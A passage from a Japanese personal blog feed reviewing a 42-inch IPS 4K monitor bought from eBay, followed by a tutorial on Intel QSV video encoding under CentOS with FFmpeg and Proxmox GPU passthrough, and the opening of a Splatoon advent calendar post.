しかし、多くのメーカーが販売している4Kディスプレイのサイズは27から32インチと、
解像度の割には小さなサイズのものしかバリエーションを取り揃えてなかったりします。
27インチWQHDディスプレイで情報量不足を感じていたのにもかかわらず、
同じサイズで4Kを出されても目を酷使しないと情報量が解像度分だけ大きくなることはありません。
4Kにしても27インチに今まで通り10ピクセルのフォントサイズでははっきり見えたものではありません（※個人の感想です）。
かといってフォントサイズを大きくしたら解像度分だけ情報量を増やすことができません。</p>

<p>27インチでWQHDなので今までは109ppiありました。この密度に慣れてしまったので、
109ppi前後の密度の4Kディスプレイに交換しないと情報量は増えないのです（※個人の感想です）。
109ppi前後の画素密度で4Kディスプレイを求めるとなると、サイズは41インチ前後となります。
そのため、41インチ前後に対象を絞って4Kディスプレイを探し始めました。</p>

<h2>41インチ前後の4Kディスプレイ</h2>

<p>41インチ前後の4Kディスプレイで日本でトップに位置する売り上げを叩き出しているものに、Philipsの<a href="http://www.amazon.co.jp/PHILIPS-40%E5%9E%8B4K%E5%AF%BE%E5%BF%9C%E3%83%AF%E3%82%A4%E3%83%89%E6%B6%B2%E6%99%B6%E3%83%87%E3%82%A3%E3%82%B9%E3%83%97%E3%83%AC%E3%82%A4-5%E5%B9%B4%E9%96%93%E3%83%95%E3%83%AB%E4%BF%9D%E8%A8%BC-BDM4065UC-11/dp/B00P9VXD9A/ref=sr_1_1?ie=UTF8&amp;qid=1452263864&amp;sr=8-1&amp;tag=mzyy-22">BDM4065UC/11</a>があります。</p>

<p><a rel="nofollow" href="http://www.amazon.co.jp/gp/product/B00P9VXD9A/ref=as_li_ss_il?ie=UTF8&camp=247&creative=7399&creativeASIN=B00P9VXD9A&linkCode=as2&tag=mzyy-22"><img border="0" src="http://ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&ASIN=B00P9VXD9A&Format=_SL250_&ID=AsinImage&MarketPlace=JP&ServiceVersion=20070822&WS=1&tag=mzyy-22" ></a></p>

<p>2014年からのロングセラー商品となっており、購入の決め手となるのはなんといっても価格。40インチサイズの情報量の多い4Kディスプレイを7万円台で購入できるとあって、長くコンスタントに売れている機種のようです。しかし、少し気になる点がありました。パネルの種類です。</p>

<h2>目に優しい4Kディスプレイ</h2>

<p>液晶ディスプレイのパネルにはいくつか種類があります。詳しいパネルの違いに関しては、古い記事ですが以下のサイトにて詳しく紹介されています。</p>

<p><a href="http://www.eizo.co.jp/eizolibrary/other/itmedia01_04/">第4回 TN？VA？IPS？──液晶パネル駆動方式の仕組みと特徴を知ろう | EIZO株式会社</a></p>

<p>FHD(1920x1080)ディスプレイが出揃い始めた頃、TNパネルやIPSパネルの良し悪しで議論が相次いでいましたが、程なくしてほとんどのパネルがIPSへと収束していきました。
4Kディスプレイもで始めた頃はTNパネル・IPSパネル両種が市場に出回っていましたが、現在はIPSに落ち着いているようです。
しかしこれは、4Kディスプレイ市場の過半数を占める27から32インチ帯での話です。
41インチ前後の4Kディスプレイでは話が変わってきます。
このサイズ帯では、ほとんどがVAパネルとなっているのです。
VAパネルも年々進化を遂げており、視野角などの問題もほとんど解消されているようです。</p>

<p>パネルの種類はそれぞれの好みが分かれる点ですが、DELLのIPSパネルを使い続けていて目に優しく疲れにくかったため、IPSパネルを採用する4Kディスプレイを購入したく思いました。
ここで日本国内で販売・購入できる41インチ前後の4Kディスプレイを並べてみます。</p>

<table>
<thead>
<tr>
<th style="text-align:center;">型番 </th>
<th style="text-align:center;"> メーカー </th>
<th style="text-align:center;"> サイズ </th>
<th style="text-align:center;"> パネル </th>
<th style="text-align:center;"> 発売日</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;"><a href="http://www.amazon.co.jp/gp/product/B018T5WQPE/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B018T5WQPE&amp;linkCode=as2&amp;tag=mzyy-22">LCD-M4K401XVB</a> </td>
<td style="text-align:center;"> I-O DATA </td>
<td style="text-align:center;"> 39.5インチ </td>
<td style="text-align:center;"> VA </td>
<td style="text-align:center;">2015/12/25</td>
</tr>
<tr>
<td style="text-align:center;"><a href="http://www.amazon.co.jp/gp/product/B012LTUJDA/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B012LTUJDA&amp;linkCode=as2&amp;tag=mzyy-22">X4070UHS</a> </td>
<td style="text-align:center;"> iiyama </td>
<td style="text-align:center;"> 40インチ </td>
<td style="text-align:center;"> MVA </td>
<td style="text-align:center;"> 2015/7/27</td>
</tr>
<tr>
<td style="text-align:center;"><a href="http://www.amazon.co.jp/gp/product/B00P9VXD9A/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00P9VXD9A&amp;linkCode=as2&amp;tag=mzyy-22">BDM4065UC/11</a> </td>
<td style="text-align:center;"> Philips </td>
<td style="text-align:center;"> 40インチ </td>
<td style="text-align:center;"> VA </td>
<td style="text-align:center;"> 2014/12/27</td>
</tr>
<tr>
<td style="text-align:center;"><a href="http://www.amazon.co.jp/gp/product/B011AODN62/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B011AODN62&amp;linkCode=as2&amp;tag=mzyy-22">D431US</a> </td>
<td style="text-align:center;"> DOSHISHA </td>
<td style="text-align:center;"> 43インチ </td>
<td style="text-align:center;"> VA </td>
<td style="text-align:center;"> 2015/7/27</td>
</tr>
<tr>
<td style="text-align:center;"><a href="http://ck.jp.ap.valuecommerce.com/servlet/referral?sid=3198126&amp;pid=883920088&amp;vc_url=http%3A%2F%2Fonline.nojima.co.jp%2Fcommodity%2F1%2F0479960004685%2F">EFK-43M4KD</a> </td>
<td style="text-align:center;"> nojima </td>
<td style="text-align:center;"> 43インチ </td>
<td style="text-align:center;"> IPS </td>
<td style="text-align:center;"> 2015/11/15</td>
</tr>
</tbody>
</table>


<p>前途の通り、大半がVAパネルとなっています。昨年の暮れに発売されたnojimaの製品が国内販売されている41インチ前後の4Kディスプレイで唯一のIPSパネルになります。
しかし、購入者レビューを漁ってみたところ、妥協する点が多く感じた上に、せっかくの<em>広大なサイズを生かした機能</em>が搭載されていないことが大きなマイナスポイントとなっています。</p>

<h2>広大なサイズを生かした様々な機能</h2>

<p>41インチ級4Kディスプレイをの広大なピクセルをすべて使い、一つの映像を表示するだけでも十分に多くの情報を表示・閲覧できます。
そこに加えて他の映像を追加して表示させてると、広さゆえより快適になるのではないでしょうか。
例えるなら、27インチWQHDにもう一枚27インチWQHDディスプレイを買い足し、デュアルディスプレイにして二つの映像を表示することで、快適度が随分とあがります。
同じように快適度をあげられる機能が、いくつかの大型のディスプレイには4Kに限らず搭載されており、仕組みとしては1枚のディスプレイを分割し擬似的に複数のディスプレイとして表示させるものとなっています。
Picture by Pictureや、Picture in Pictureと呼ばれる機能です。
41インチ級のディスプレイを購入する上で、これらは個人的に欠かせない機能となっていました。</p>

<h3>Picture by Picture (PbP)</h3>

<p><img src="http://mzyy94.com/blog/resources/images/2016/01/10/PbP.png" alt="Picture by Picture" /></p>

<p>1枚のディスプレイを縦や横に分割して表示する機能です。
ディスプレイに備わっている映像入力ポートからの入力を2つ選択し、
左右または上下もしくはその両方に分割された擬似的な複数の画面にそれぞれ映像を出力できるものです。
2画面分割に限らず、3画面、4画面の分割をサポートしているものもあります。
これによって、ベゼル幅0mmの狭額縁のディスプレイでデュアルディスプレイをしているような感覚になります。</p>

<h3>Picture in Picture (PiP)</h3>

<p><img src="http://mzyy94.com/blog/resources/images/2016/01/10/PiP.png" alt="Picture in Picture" /></p>

<p>一つの映像の上に小画面を表示し、ながら作業ができるものです。
これもまたディスプレイの映像入力ポートからメインと小画面の映像を選択し、表示させるものです。
大画面を必要とする作業をしながらテレビを見たいときなどに便利な機能です。</p>

<h2>海外の41インチ級4Kディスプレイ</h2>

<p>これまでに述べてきた新規購入する4Kディスプレイに求める特徴は、</p>

<ul>
<li>109ppi以上 = 41インチ前後</li>
<li>IPS/AH-IPSパネル採用</li>
<li>PiP/PbPが可能</li>
</ul>


<p>です。
一つ目の条件から、国内で購入できるものは先の一覧にあるとおり5種類しかありません。2つ目の条件で絞るとnojimaのEFK-43M4KDしか残りません。3つ目の条件をも当てはめると、それすらも消えてしまします。
日本で販売されている製品の中からでは希望の4Kディスプレイは見つけられないという結論が出ました。</p>

<p>なので日本で販売されている製品に限らず、海外でのみ販売されているような4Kディスプレイにまで視野を広げて考えることにしました。
海外の4K液晶情報は情報はなかなかWebにはまとめられておらず、条件に合うものを見つけるのに苦労しましたが、いくつかのメーカーの製品がヒットしました。</p>

<h3>Crossover 434K IPS Final</h3>

<p><a href="http://rover.ebay.com/rover/1/711-53200-19255-0/1?icep_ff3=9&amp;pub=5575151077&amp;toolid=10001&amp;campid=5337802045&amp;customid=&amp;icep_uq=434K+IPS+Final&amp;icep_sellerId=&amp;icep_ex_kw=&amp;icep_sortBy=12&amp;icep_catId=80053&amp;icep_minPrice=&amp;icep_maxPrice=&amp;ipn=psmain&amp;icep_vectorid=229466&amp;kwid=902099&amp;mtid=824&amp;kw=lg"><strong>Crossover 434K IPS Final</strong></a></p>

<p>上記3条件全てに合致しているCrossover社の43インチ4Kディスプレイです。
日本語で書かれている仕様が見つからなかったので、Google翻訳で訳した製品仕様は以下のようになっていました。</p>

<table>
<thead>
<tr>
<th style="text-align:center;">項目 </th>
<th style="text-align:left;"> 機能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;">サイズ</td>
<td style="text-align:left;"> 43インチ</td>
</tr>
<tr>
<td style="text-align:center;">パネル</td>
<td style="text-align:left;"> AH-IPS</td>
</tr>
<tr>
<td style="text-align:center;">解像度</td>
<td style="text-align:left;"> 3840x2160 60Hz</td>
</tr>
<tr>
<td style="text-align:center;">応答時間 </td>
<td style="text-align:left;"> 5ms</td>
</tr>
<tr>
<td style="text-align:center;">視野角</td>
<td style="text-align:left;"> 上下左右178°</td>
</tr>
<tr>
<td style="text-align:center;">DisplayPort入力 </td>
<td style="text-align:left;"> 2 (Ver1.2)</td>
</tr>
<tr>
<td style="text-align:center;">HDMI入力 </td>
<td style="text-align:left;"> 3 (Ver2.0)</td>
</tr>
<tr>
<td style="text-align:center;">VGA入力 </td>
<td style="text-align:left;"> 1</td>
</tr>
<tr>
<td style="text-align:center;">PbP </td>
<td style="text-align:left;"> ◯(2画面,3画面,4画面)</td>
</tr>
<tr>
<td style="text-align:center;">PiP </td>
<td style="text-align:left;"> ◯</td>
</tr>
<tr>
<td style="text-align:center;">USBハブ </td>
<td style="text-align:left;"> ×</td>
</tr>
</tbody>
</table>


<h3>WasabiMango UHD420 REAL4K HDMI 2.0</h3>

<p><a href="http://rover.ebay.com/rover/1/711-53200-19255-0/1?icep_ff3=2&amp;pub=5575151077&amp;toolid=10001&amp;campid=5337802045&amp;customid=&amp;icep_item=131556558528&amp;ipn=psmain&amp;icep_vectorid=229466&amp;kwid=902099&amp;mtid=824&amp;kw=lg"><strong>UHD420 REAL4K HDMI 2.0</strong></a></p>

<p>Crossover社の製品に似た、WasabiMango社の42インチサイズの4Kディスプレイです。
これもまた日本語で書かれている仕様が見つからなかったので、Google翻訳で訳した製品仕様は以下のようになっていました。</p>

<table>
<thead>
<tr>
<th style="text-align:center;">項目 </th>
<th style="text-align:left;"> 機能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;">サイズ</td>
<td style="text-align:left;"> 42インチ</td>
</tr>
<tr>
<td style="text-align:center;">パネル</td>
<td style="text-align:left;"> AH-IPS</td>
</tr>
<tr>
<td style="text-align:center;">解像度</td>
<td style="text-align:left;"> 3840x2160 60Hz</td>
</tr>
<tr>
<td style="text-align:center;">応答時間 </td>
<td style="text-align:left;"> 5ms</td>
</tr>
<tr>
<td style="text-align:center;">視野角</td>
<td style="text-align:left;"> 上下左右178°</td>
</tr>
<tr>
<td style="text-align:center;">DisplayPort入力 </td>
<td style="text-align:left;"> 1 (Ver1.2)</td>
</tr>
<tr>
<td style="text-align:center;">HDMI入力 </td>
<td style="text-align:left;"> 4 (Ver2.0 x2, Ver1.4 x2)</td>
</tr>
<tr>
<td style="text-align:center;">VGA入力 </td>
<td style="text-align:left;"> 1</td>
</tr>
<tr>
<td style="text-align:center;">PbP </td>
<td style="text-align:left;"> ◯(2画面,3画面,4画面)</td>
</tr>
<tr>
<td style="text-align:center;">PiP </td>
<td style="text-align:left;"> ◯</td>
</tr>
<tr>
<td style="text-align:center;">USBハブ </td>
<td style="text-align:left;"> ◯ (USB 3.0x3)</td>
</tr>
</tbody>
</table>


<h2>UHD420 REAL4K HDMI 2.0購入</h2>

<p>上記2製品どちらも希望を満たすスペックだった上に見た目も酷似していたため、どちらを選んでも満足度は同じであろうと思っていたのですが、前者はeBayに在庫がなかったため、後者のUHD 420 REAL4K HDMI 2.0を購入しました。
在庫があり最安だった<a href="http://rover.ebay.com/rover/1/711-53200-19255-0/1?icep_ff3=2&amp;pub=5575151077&amp;toolid=10001&amp;campid=5337802045&amp;customid=&amp;icep_item=131556558528&amp;ipn=psmain&amp;icep_vectorid=229466&amp;kwid=902099&amp;mtid=824&amp;kw=lg">送料込み489英ポンドの品</a>を発注し、PayPalで送金後2日足らずで届きました。eBayのポンド→円レートと商品受取時の関税支払いを合わせて88,200円でした。</p>

<h3>箱サイズ</h3>

<p>プチプチを剥がすときにすこし破損してしまいましたが、箱のサイズはこのくらい</p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/01/10/box-size.jpg" alt="Box size" /></p>

<p>上に乗ってるのはきんいろモザイクのBlu-rayディスクケースと500mlペットボトル（サイズ感伝わってくれっ</p>

<h3>付属品</h3>

<p>そして付属品</p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/01/10/display-accessories.jpg" alt="Display accessories" /></p>

<p>電源ケーブル・HDMIケーブル・DisplayPortケーブル・USB 3.0ケーブル(オス-オス)・ネジ6本・説明書、そして写真には写っていないですが、設定操作リモコンとディスプレイの足が入っていました。
付属品のネジはおそらくディスプレイに足を取り付けるためのものだと思うんですが、ディスプレイに空いている足取り付け用のネジ穴に入れてもガバガバで取り付けられませんでした。
測ってみたところ、付属していたネジはM4x10mmで、ディスプレイに空いている足取り付け用のネジ穴はM5径でした。そりゃ全然合わないわけだ。
M5ネジは近場で買える代物だったので、問い合わせすることなく近所のホームセンターに買いに行き、M5x15mm + ナット + ワッシャー各4個入りを買ってきました。
M5x10mmは売ってなかったので、ネジが奥まで入る長さにナットで調節しながら足を止めたらしっかりと安定して固定することができました。</p>

<h3>ポート類</h3>

<p>入力ポート・出力ポート</p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/01/10/display-input.jpg" alt="display input" />
<img src="http://mzyy94.com/blog/resources/images/2016/01/10/usb-output.jpg" alt="usb output" /></p>

<p>USBハブの入力がtype-Aである点が少々気になったり。
サービスUSBポート経由でファームウェアのアップデートができるとの噂があったり。</p>

<h3>設置</h3>

<p>でかさ比較</p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/01/10/display-size.jpg" alt="display relative size" /></p>

<p>右に写ってるのがMacBook Air 11インチで左に写ってるのがWii U ゲームパッドです（サイズ感伝わってくれっ！）
一言で大きさを表現すると、<strong>広げた新聞紙くらい</strong>。
ちなみにこの写真を撮るときにiPhoneのカメラ越しにディスプレイを見てみましたが、ちらつきはなくフリッカーフリーのようです。</p>

<h2>MacBook Air Mid2013の外部出力</h2>

<p>3年前のMacBook Airにこの4Kディスプレイをつないだところ、1920x1080として認識されてしまいました。
せっかくの4Kを一切生かしきれていない状態だったので、出力解像度を書き換えてシステムに認識されているサイズ以上の出力をできるようにするソフトウェアを導入しました。</p>

<p><a href="http://www.madrau.com/">SwitchResX - The Most Versatile Tool For Controlling Screen Resolutions On Your Mac</a></p>

<p>これで出力解像度に4Kを追加すれば動くぞ！っと意気揚々に設定をいじって書き込んでみましたが、対応させられませんとのエラーが。
画面出力を司るシステムのフレームワークを書き換えたりカーネルモジュールを入れ替えたりなども試してみましたが、どれを用いても4K画質を出力させるまでには至りませんでした。
これでは何のために買ったのやら…と途方にくれていましたが、よくよく考えればPbPでテレビを映しながら作業ができるようにPbP/PiP機能付きのものを買っていたので、4K全画面表示させる必要はないのです。
左半分をメインに、右にサブのWindowsとゲームもしくはテレビを上下に分けて表示できれば十分なのです。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/01/10/3-displays.png" alt="3 displays" /></p>

<p>これらはディスプレイの設定をいじって3画面PbPにし、それぞれの映像入力を指定するだけで分割できます。
3画面分割にすると、メインの画面解像度は4Kの半分となり、1920x2160になります。OS X標準ではこの解像度を出すことはできないので、先ほど導入したSwitchResXを用いて、1920x2160の出力設定を追加します。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/01/10/additional-resolution.png" alt="additional resolution" /></p>

<p>再起動すると、以下のように1920x2160の解像度が追加されます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/01/10/1920x2160.png" alt="1920x2160" /></p>

<p>＼じゃーん／</p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/01/10/3-pbp.jpg" alt="3-pbp" /></p>

<h2>まとめ</h2>

<p>4Kはいいぞ。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[クリスマスなのでLinuxでQSVエンコードする]]></title>
    <link href="http://mzyy94.com/blog/2015/12/21/linux-qsv-encode/"/>
    <updated>2015-12-21T23:58:29+09:00</updated>
    <id>http://mzyy94.com/blog/2015/12/21/linux-qsv-encode</id>
    <content type="html"><![CDATA[<p>こちらは<a href="http://www.adventar.org/calendars/835">DTV Advent Calendar</a> 21日目の記事です。</p>

<p>みなさん録画データの管理はどうしていますか？
視聴したら消す人もいれば、視聴しても残しておく人、視聴してない詰みTSがたくさんある人、いろいろあると思います。
残しておけば不慮の事故がない限り、いつでも見返すことができますが、どんどんとHDDの空き容量が少なくなっていくのが現実です。
私は録画データは変換せずに取って置く人間なので、Disk fullで録画失敗した回数は数知れず、これまで2年間で10TB超の録画が溜まっています。
年末の大掃除も兼ねて、いくつか録画データを削除したくもなかなか踏み切れず、結局空き容量は一つも増えていません。</p>

<p>これでは年始の相棒スペシャルが録画できないので、録画データを消さずに空き容量を増やさなければなりません。
そこで考えられるのが動画のエンコード。DTV Advent Calendar経由でこの記事に他取り付いた人にとっては当たり前のことかもしれませんが、録画データをH.264エンコードして保管することにしました。</p>

<p>そこで検討する必要があるのがエンコード方法。
地デジにおいてはx264を用いたソフトウェアエンコードが一般的なようですが、他にもNVidia製GPUを用いたnvencやIntel CPUに搭載のグラフィックプロセッサによるQuick Sync Video(QSV)などがあります。
Linuxにおいてはffmpeg/x264のソフトウェアエンコードの方法ばかりがWebに蔓延する中、他の方法はほとんど取り上げられていません。寂しいです。</p>

<p>前置きが長くなりましたが、LinuxでQSVエンコードする方法をご紹介します。</p>

<!-- more -->


<h1>FFmpegによるLinuxでのQSVエンコード</h1>

<p>今年の頭に書いた記事でもLinuxでのQSVを取り上げました(参照: <a href="https://mzyy94.com/blog/2015/01/30/intel-qsv-on-linux/">Intel QSVのH.264エンコードをLinuxで！ - 犬アイコンのみっきー</a>)。しかしあれから約１年が経ち、いろいろと変わってきたので
環境の再構築とパッケージの修正などを行いました。
QSVエンコード環境の導入に関して必要なエンコーダーは、自分で用意する必要もなくなり、QSVを利用できる環境も大きく変わりました。</p>

<p>今回紹介するバージョンでは以下の環境でのみ動作します。</p>

<table>
<thead>
<tr>
<th style="text-align:center;">  項目名</th>
<th style="text-align:center;"> 対応環境 </th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;">  CPU   </td>
<td style="text-align:center;"> Haswell/Broadwell Core iシリーズ, Xeon E3 v3/v4 with GPU </td>
</tr>
<tr>
<td style="text-align:center;">  OS    </td>
<td style="text-align:center;"> CentOS 7.1 </td>
</tr>
</tbody>
</table>


<h2>環境構築</h2>

<p>今回構成するシステムは下図のようになっています。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/12/21/recording-server.png" width="640" height="480"></p>

<p>PT3とUSB ICカードリーダーをパススルーした<a href="https://github.com/kanreisa/Chinachu">Chinachu</a>環境に加えて、Intel HD GraphicsをパススルーしたQSVエンコード用のCentOSを<a href="https://pve.proxmox.com/">ProxMox VE</a>の上で動作させています。
今回はQSVのお話なのでChinachuの環境構築の紹介はしません。</p>

<h3>Intel HD Graphics Pass-through</h3>

<p>昨年のLinux Advent CalendarにてIntel HD Graphics Pass-throughを取り上げましたが(参照：<a href="https://mzyy94.com/blog/2014/12/12/kvm-intel-hd-graphics-passthrough/">KVMでQSVするためIntel HD Graphicsパススルーするー</a>)、あれから1年が経ち色々と変わってきている部分があります。
1年前は<a href="https://www.proxmox.com/">ProxMox</a> 3.2で構築していた仮想マシンも今では4.1となり、自前でカーネルをビルドする必要がなくなったことが大きな違いです。
そのため、ProxMoxのカーネルはそのままに、Pass-through機能を有効にする設定をいじるだけでIntel HD Graphicsのパススルーができます。</p>

<p>前回の方法では自前ビルドのカーネルで有効にしていたIOMMUの機能が、ProxMox 4.1の標準カーネルではデフォルト無効になっているので、有効にしてあげるように起動時パラメータを指定します。
root権限で以下のように実行し、IOMMUを有効化します。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># sed -i -e 's/\(GRUB_CMDLINE_LINUX="\)\(.*"\)/\1intel_iommu=on \2/' /etc/default/grub
</span><span class='line'># grub-mkconfig -o /boot/grub/grub.cfg
</span><span class='line'># reboot</span></code></pre></td></tr></table></div></figure>


<p>IOMMUが有効になれば、あとは仮想マシンの設定ファイルにIntel HD Graphicsをパススルーする記述を加えるのみです。
全体的には以下のようなPorxMox仮想マシン設定ファイルが出来上がりました。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bios: ovmf
</span><span class='line'>boot: cdn
</span><span class='line'>bootdisk: sata0
</span><span class='line'>cores: 4
</span><span class='line'>cpu: host
</span><span class='line'>hostpci0: 00:02.0,pcie=1,rombar=on,x-vga=on
</span><span class='line'>ide2: iso-image:iso/CentOS-7-x86_64-Minimal.iso,media=cdrom
</span><span class='line'>machine: q35
</span><span class='line'>memory: 4096
</span><span class='line'>name: QSV
</span><span class='line'>net0: e1000=66:63:63:25:51:27,bridge=vmbr0
</span><span class='line'>numa: 0
</span><span class='line'>ostype: l26
</span><span class='line'>sata0: local:115/vm-115-disk-1.qcow2,size=32G
</span><span class='line'>serial0: socket
</span><span class='line'>smbios1: uuid=4b9f905b-66a5-4858-b1db-914bfd369aeb
</span><span class='line'>sockets: 1</span></code></pre></td></tr></table></div></figure>


<p>CentOSにてQSV対応カーネルをビルドする都合上、4コア割り当てていますが環境構築後は1コアに変更しても十分なパフォーマンスが発揮できます。
あとはこのパススルーした仮想マシンにCentOS 7.1をインストールし、QSVエンコード環境を作っていきます。
仮想マシンであろうがなかろうが続くQSV環境の導入に関する話で行うことは全く一緒なので、素のCentOS 7.1で行っているものとして読んでください。</p>

<h2>Intel Media Server Studio</h2>

<p>今年の頭に書いた記事でもIntel Media Server Studio(以下、MSS)を紹介しましたが、当時は数千ドルする有償SDKのみの公開だったため、試用期間しか利用できず、導入方法とエンコードの実験を行うだけでした。
しかし、今年9月にMSSのアップデートがあり、バージョンR6の登場とともに無償のCommunity Editionが公開され、私的利用の範囲で無期限で利用することができるようになりました。
今回はそれを導入し、QSVによる動画のH.264エンコードを行います。</p>

<p><a href="https://software.intel.com/en-us/intel-media-server-studio">Intel® Media Server Studio | Intel® Developer Zone</a></p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/12/21/get-mss.png" alt="Get Intel Media Server Studio" /></p>

<p>手順は前に紹介した時のものとあまり大きくは変わらないのですが、今回もMSSのインストールスクリプトに少々バグがあります。
文字でつらつらと説明するのも読者側からすればめんどくさいの一言で嫌われてしまう記事になってしまうので、MSSのインストールスクリプトを用意しました。</p>

<p><a href="https://github.com/mzyy94/QSV-on-Linux"><strong>mzyy94/QSV-on-Linux on GitHub</strong></a></p>

<p>README.mdを読み、スクリプトの内容を確認し、MSSを用意したら以下のようにコマンドを叩くとインストールされます。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./install-MSS.sh</span></code></pre></td></tr></table></div></figure>


<h2>FFmpegによるQSVエンコード</h2>

<p>FFmpegもバージョンアップがあり、昨日2015/12/20にバージョン2.8.4が公開されました。
この1年のバージョンアップの間に標準でQSVエンコーダーが搭載され手動で追加する必要がなくなりました。
しかし今回導入したMSS 2015 R6では必要なファイルが不足しているため、いくつか手を加えなければいけません。
これもまた何をするかを事細かに説明するよりかはスクリプト実行で導入できた方が楽なので、よしなにしてくれるものを用意してあります。</p>

<p>先ほどのリポジトリに移動し、以下のようにすることでQSVに対応したFFmpegができあがります。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./build-ffmpeg.sh</span></code></pre></td></tr></table></div></figure>


<p>他のエンコーダー/デコーダーが必要な場合は適宜修正して導入してください。</p>

<h2>地デジをエンコード</h2>

<p>DTV(Digital TeleVision = デジタルテレビ放送) Advent Calendarのネタなので、地上デジタル放送の録画TSファイルをエンコードしてやっと完結です。
ということで、2015/12/19放映のご注文はうさぎですか??第11羽をエンコードしてみます。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ffmpeg -y -i gr23608-18yd.m2ts -f mp4 -vcodec h264_qsv -vprofile main -level 4.1 -s 1280x720 -r 24 -q 20 -acodec copy gochiusa11.mp4</span></code></pre></td></tr></table></div></figure>


<p>と、エンコードしてみたものの、ProxMox 4.xのバグらしいものを踏んでしまい、ホストOSがｶｰﾈﾙﾊﾟﾆｯｸになってしまったために、エンコードが終了しませんでした。
なので投稿日の夕方になってベアメタルマシンに導入して試しています（故にAdvent Calendarに間に合わなカッタ）。</p>

<h3>結果</h3>

<p>約9分でQSVによるH.264エンコードが終わりました。</p>

<table>
<thead>
<tr>
<th style="text-align:center;"> 項目 </th>
<th style="text-align:center;"> 元ファイル </th>
<th style="text-align:center;"> 変換後ファイル </th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;"> 長さ </td>
<td style="text-align:center;"> 29:56 </td>
<td style="text-align:center;"> 29:56(カットなし) </td>
</tr>
<tr>
<td style="text-align:center;"> ファイルサイズ </td>
<td style="text-align:center;"> 1963490988 bytes (1.87GB) </td>
<td style="text-align:center;"> 62257131 bytes (594MB)  </td>
</tr>
<tr>
<td style="text-align:center;"> 解像度 </td>
<td style="text-align:center;"> 1440x1088 </td>
<td style="text-align:center;"> 1280x738 </td>
</tr>
<tr>
<td style="text-align:center;"> フレームレート </td>
<td style="text-align:center;"> 29.97 </td>
<td style="text-align:center;"> 24.00 </td>
</tr>
<tr>
<td style="text-align:center;"> 動画コーデック </td>
<td style="text-align:center;"> MPEG-2 </td>
<td style="text-align:center;"> H.264 </td>
</tr>
<tr>
<td style="text-align:center;"> 音声コーデック </td>
<td style="text-align:center;"> AAC </td>
<td style="text-align:center;"> AAC(無変換) </td>
</tr>
</tbody>
</table>


<h4>元ファイル(MPEG-2)</h4>

<p><a href="http://mzyy94.com/blog/resources/images/2015/12/21/syaro-original.png"><img src="http://mzyy94.com/blog/resources/images/2015/12/21/syaro-original.png" alt="シャロシコ Original" /></a></p>

<h4>変換後ファイル(H.264)</h4>

<p><a href="http://mzyy94.com/blog/resources/images/2015/12/21/syaro-qsv.png"><img src="http://mzyy94.com/blog/resources/images/2015/12/21/syaro-qsv.png" alt="シャロシコ QSV" /></a></p>

<hr />

<p>以上、DTV Advent Calendar 21日目の記事でした。
明日は<a href="https://twitter.com/rndomhack">rndomhack</a>さんです。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[実践イカパケット解析のスライドテーマ]]></title>
    <link href="http://mzyy94.com/blog/2015/12/08/packetoon-after-that/"/>
    <updated>2015-12-08T02:06:35+09:00</updated>
    <id>http://mzyy94.com/blog/2015/12/08/packetoon-after-that</id>
    <content type="html"><![CDATA[<p>この記事は<a href="http://www.adventar.org/calendars/801">Splatoon Advent Calendar</a>の8日目の記事です。</p>

<p>こんにちは、ウデマエA+のボーイです。昨日の<a href="http://mzsm.me/2015/12/07/splatoon-advent-calendar-2015-ikadenwa-webrtc/">mzsmさんの記事</a>末尾にこんなことが書いてありました。</p>

<blockquote><p> 明日のSplatoon Advent Calendarは、Wii Uを柚子胡椒まみれにして故障させてしまうという不運にもめげずにイカパケット解析をした話をみっきー氏が書いてくれるようです。</p></blockquote>

<p>大変にハードルを上げるバトンタッチを受けて少々困惑気味です。
というのも、イカパケット解析の話をするという内容で<del>煽りイカ</del>紹介していただいたのですが、いろいろあって今回イカパケット解析の話は出てこないからです。
期待していたみなさま、ごめんなさい。</p>

